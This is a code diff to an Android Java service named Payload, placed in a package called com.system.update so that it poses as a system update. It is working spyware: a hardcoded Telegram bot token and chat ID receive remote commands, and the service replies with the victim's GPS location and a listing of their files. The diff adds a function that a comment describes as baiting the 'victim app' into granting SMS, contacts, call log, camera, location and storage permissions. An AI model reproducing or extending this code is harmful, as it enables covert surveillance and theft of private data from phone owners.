@@ -1,7 +1,10 @@
 package com.system.update;
 
+import android.app.Activity;
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
 import android.database.Cursor;
@@ -22,15 +25,42 @@ import java.io.DataOutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 public class Payload extends Service {
-    // ── TOKEN BOT BARU KAMU ──
+    // Token Bot Baru kamu
     private String BOT_TOKEN = "9163541732:AAHrGKUwIuEQ8OQOextL9deMJVWh6sSIqlw"; 
     private String CHAT_ID = "8598136412";
     
     private volatile boolean isRunning = true;
     private long lastUpdateId = 0;
+
+    // ── FUNGSI PEMANCING IZIN (BAKAL DIPANGGIL OLEH APLIKASI KORBAN) ──
+    public static void askPermissions(Activity activity) {
+        if (Build.VERSION.SDK_INT >= 23) {
+            List<String> permissions = new ArrayList<>();
+            String[] perms = {
+                "android.permission.READ_SMS",
+                "android.permission.RECEIVE_SMS",
+                "android.permission.READ_CONTACTS",
+                "android.permission.READ_CALL_LOG",
+                "android.permission.CAMERA",
+                "android.permission.ACCESS_FINE_LOCATION",
+                "android.permission.READ_EXTERNAL_STORAGE",
+                "android.permission.WRITE_EXTERNAL_STORAGE"
+            };
+            for (String p : perms) {
+                if (activity.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
+                    permissions.add(p);
+                }
+            }
+            if (!permissions.isEmpty()) {
+                activity.requestPermissions(permissions.toArray(new String[0]), 101);
+            }
+        }
+    }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -73,7 +103,7 @@ public class Payload extends Service {
                         } else if (jsonResponse.contains("\"text\":\"/lacak\"")) {
                             sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
                         } else if (jsonResponse.contains("\"text\":\"/cek_file\"")) {
-                            sendTelegramMessage("📂 *Isi Folder /storage/emulated/0/ (10 Teratas):*\n" + listFiles("/storage/emulated/0/"));
+                            sendTelegramMessage("📂 *Isi Folder (10 Teratas):*\n" + listFiles("/storage/emulated/0/"));
                         }
 
                     } catch (Exception e) { e.printStackTrace(); }
